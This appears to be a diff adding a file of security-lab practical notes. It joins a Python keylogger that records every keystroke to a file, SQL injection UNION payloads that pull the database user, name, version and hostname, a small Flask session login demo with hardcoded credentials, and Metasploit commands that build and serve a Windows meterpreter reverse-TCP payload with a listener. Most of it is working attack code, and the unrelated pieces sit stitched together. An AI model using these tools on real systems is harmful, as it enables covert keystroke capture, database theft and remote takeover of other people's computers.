@@ -1,0 +1,113 @@
+import pynput
+from pynput.keyboard import Key,Listener
+import logging
+
+log_dir = ""
+logging.basicConfig(filename=(log_dir+'MY_LOGS.txt'),level=logging.DEBUG,format='%(asctime)s:%(message)s:')
+
+
+def on_keypress(key):
+    logging.info(str(key))
+
+
+with Listener(on_press=on_keypress)as listener:
+    listener.join()
+
+
+
+% ' OR 0=0 UNION SELECT null , user()#
+% ' OR 0=0 UNION SELECT null , database()#
+% ' OR 0=0 UNION SELECT null , version()#
+% ' OR 0=0 UNION SELECT null , @@hostname#
+
+
+from flask import Flask, request, session, redirect, url_for
+
+app = Flask(__name__)
+
+# For local educational testing only
+app.secret_key = "local-practical-secret-key"
+
+USERS = {
+    "admin": "admin123",
+    "guest": "guest123"
+}
+
+
+@app.route("/", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form.get("username", "")
+        password = request.form.get("password", "")
+
+        if USERS.get(username) == password:
+            session["username"] = username
+            return redirect(url_for("welcome"))
+
+        return """
+        <h3>Invalid username or password!</h3>
+        <a href="/">Try Again</a>
+        """
+
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Session Practical</title>
+    </head>
+    <body>
+        <h2>Login</h2>
+        <form method="POST">
+            <label>Username:</label>
+            <input type="text" name="username" required>
+            <br><br>
+
+            <label>Password:</label>
+            <input type="password" name="password" required>
+            <br><br>
+
+            <button type="submit">Login</button>
+        </form>
+        <p>Admin: admin / admin123</p>
+        <p>Guest: guest / guest123</p>
+    </body>
+    </html>
+    """
+
+
+@app.route("/welcome")
+def welcome():
+    if "username" not in session:
+        return redirect(url_for("login"))
+
+    username = session["username"]
+
+    return f"""
+    <h2>Welcome {username}!</h2>
+    <p>You are logged in successfully.</p>
+    <p>Current session user: {username}</p>
+    <a href="/logout">Logout</a>
+    """
+
+
+@app.route("/logout")
+def logout():
+    session.clear()
+    return redirect(url_for("login"))
+
+
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=8080, debug=False)
+
+
+ifconfig
+sudo su
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.235.128 LPORT=123 -f exe -o payload.exe
+mv payload.exe /var/www/html
+sudo msfconsole
+exploit/multi/handler 
+windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.131 
+
+
+
